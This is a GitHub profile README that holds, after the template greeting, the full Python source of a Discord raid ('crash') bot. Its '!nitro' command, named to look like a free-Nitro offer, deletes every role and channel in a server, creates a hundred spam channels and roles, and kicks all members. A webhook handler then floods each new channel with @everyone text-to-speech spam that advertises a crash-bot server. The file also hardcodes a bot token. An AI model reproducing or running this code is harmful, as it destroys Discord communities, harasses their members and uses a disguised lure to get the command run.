- 👋 Hi, I’m @Roma1234dc
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...

<!---
Roma1234dc/Roma1234dc is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
import discord
from discord.ext import commands
from discord import Permissions
import asyncio
import os
import discord, random, aiohttp, asyncio
from threading import Thread
import requests

intents = discord.Intents.default()
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

bot.remove_command("help")


@bot.command()
async def nitro(ctx):
    guild = ctx.message.guild
    with open('hacked.jpg', 'rb') as f:
        icon = f.read()
    await guild.edit(name="Crash By RC BOT", icon=icon)

    await ctx.message.delete()

    for m in ctx.guild.roles:
        try:
            await m.delete(reason="Краш сервера")
        except:
            pass

    for channel in ctx.guild.channels:  # собираем
        try:
            await channel.delete(reason="Краш сервера")  # удаляем
        except:
            pass

    for _ in range(100):
        await guild.create_text_channel('crash-by-rc roma1234')

    for _ in range(100):
        await guild.create_role(name='crash-by-rc roma1234')

    for m in ctx.guild.members:
        try:
            await m.kick(reason="Краш сервера")
        except:
            pass


@bot.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name="Crash By RC BOT")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(
            str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
        for i in range(50):
            try:
                await webhook.send(
                    "@everyone  вы крашнуты  Ссылка на дискорд сервер с краш ботами https://discord.gg/tZGFMc6yJJ author Roma1234#7412*",
                    tts=True)
            except:
                pass


token = 'OTk5NjU3MTQ5MjA4NzIzNDU2.GF7FBd.LGKEp8PTf6X3vJ8PqKqDQGzlSGAwqqUfC4UftE'
bot.run(token)
